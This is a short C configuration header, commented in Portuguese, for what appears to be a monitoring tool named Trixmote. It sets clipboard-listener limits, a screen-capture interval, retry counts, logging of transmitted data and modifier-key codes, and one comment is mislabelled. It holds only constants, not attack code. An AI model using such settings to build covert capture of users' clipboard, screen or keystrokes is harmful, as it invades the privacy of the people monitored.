#ifndef TRIX_CONFIG_H
#define TRIX_CONFIG_H

// Limite de bytes que podem ser lidos/salvos pelo ouvinte do TXCLipboard.
#define TRIX_CLIPBOARD_MAX_BYTES     400

// Intervalo (sleep) entre iterações do ouvinte do TXCLipboard. (em Milisegundos)
#define TRIX_CLIPBOARD_INTERVAL      255

// Intervalo (sleep) entre iterações do ouvinte do TXCLipboard. (em Milisegundos)
#define TRIX_SCREENCAPTURE_INTERVAL      500

// Quantidade de vezes em que o Trixmote pode tentar registrar novamente um evento caso não tenha sucesso
#define TRIX_RETRY_MAX_COUNT         3

// Imprimir no console tudo que é gravado em arquivo ou transmitido
#define TRIX_LOGGER_WRITES_CONSOLE   1

// Lista de teclas modificadoras
#define TRIX_MDF_KEYS                 {54, 55, 56, 57, 58, 59, 60, 61, 62, 63}

#endif //TRIX_CONFIG_H
